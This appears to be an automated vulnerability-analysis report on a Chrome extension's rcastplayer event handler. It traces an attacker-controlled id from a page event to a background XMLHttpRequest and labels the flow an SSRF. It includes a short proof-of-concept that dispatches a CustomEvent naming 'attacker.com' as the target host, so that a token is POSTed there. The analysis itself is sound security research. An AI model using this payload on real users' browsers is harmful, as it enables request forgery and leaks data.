# CoCo Analysis: jjjfindeiehoelcakfdebclnjnphhfig

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: document_eventListener_rcastplayer → XMLHttpRequest_url_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jjjfindeiehoelcakfdebclnjnphhfig/opgen_generated_files/cs_0.js
Line 524	document.addEventListener('rcastplayer', function(e) {
Line 538	rcastplayer.pairing(e.detail.id);

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jjjfindeiehoelcakfdebclnjnphhfig/opgen_generated_files/bg.js
Line 1106	ijs.ajax('http://'+connectedDevice.ip+':9845/ircast/pairing',...)

**Code:**

```javascript
// Content script (cs_0.js) - Line 524-540: DOM event listener
document.addEventListener('rcastplayer', function(e) {
  if(e.detail.type == events.SEND){
    rcastplayer.send(e.detail.url);
  }else if(e.detail.type == events.VOLUME){
    rcastplayer.setVolume(e.detail.volume);
  }else if(e.detail.type == events.PLAY){
    rcastplayer.play();
  }else if(e.detail.type == events.PAUSE){
    rcastplayer.pause();
  }else if(e.detail.type == events.SEEK){
    rcastplayer.seek(e.detail.position);
  }else if(e.detail.type == events.GETSTATUS){
    rcastplayer.getStatus();
  }else if(e.detail.type == events.CONNECT){
    rcastplayer.pairing(e.detail.id);  // ← attacker-controlled e.detail.id
  }
});

// Line 494-497: pairing function
pairing(id){
  chrome.runtime.sendMessage({action:events.CONNECT, id:id}, function(response) {
    // ← attacker-controlled id sent to background
    document.dispatchEvent(new CustomEvent('rcastplayergetpaired', {'detail': {'paired': true}}));
  });
}

// Background script (bg.js) - Line 1100-1108: Message handler
// Receives the message with attacker-controlled request.id
if(connectedDevice != null){
  ijs.ajax('http://'+connectedDevice.ip+':9845/ircast/disconnect',{post:true,send:JSON.stringify({"time":time,"hash":md5(time+''+token)})});
}
token = "asdf";
connectedDevice = {'ip':request.id,'token':token};  // ← attacker-controlled request.id stored as IP

ijs.ajax('http://'+connectedDevice.ip+':9845/ircast/pairing',{post:true,send:JSON.stringify({"type":1,"token":token}),finish:function(a){
  // ← SINK: XMLHttpRequest to attacker-controlled URL
  sendResponse(true);
}});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event dispatch from webpage

**Attack:**

```javascript
// From malicious webpage at https://radio.into.hu/*
document.dispatchEvent(new CustomEvent('rcastplayer', {
  detail: {
    type: 'CONNECT',  // events.CONNECT value
    id: 'attacker.com'  // Attacker-controlled IP/domain
  }
}));

// Extension will make request to: http://attacker.com:9845/ircast/pairing
// with POST body: {"type":1,"token":"asdf"}
```

**Impact:** Server-Side Request Forgery (SSRF) vulnerability. An attacker controlling a webpage at https://radio.into.hu/* can dispatch a custom DOM event with an arbitrary IP address or domain in the 'id' field. This value flows through the content script → background script → XMLHttpRequest, causing the extension to make privileged cross-origin HTTP POST requests to attacker-controlled URLs. The attacker can use this to scan internal networks, attack localhost services, or interact with internal infrastructure that the victim machine can access. The extension constructs the URL as `http://[attacker-controlled-ip]:9845/ircast/pairing` and sends authentication tokens in the POST body, potentially exposing sensitive data to the attacker's server.
